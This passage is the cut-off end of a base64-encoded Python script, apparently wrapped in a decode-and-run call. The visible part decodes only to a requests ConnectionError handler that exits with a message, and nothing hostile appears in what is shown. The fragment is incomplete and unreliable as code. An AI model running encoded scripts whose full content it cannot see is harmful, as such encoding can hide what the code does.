ICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKICAgICAgICAgICAgICAgIGV4aXQoIiMgQ29ubmVjdGlvbiBlcnJvciIpCg=='))
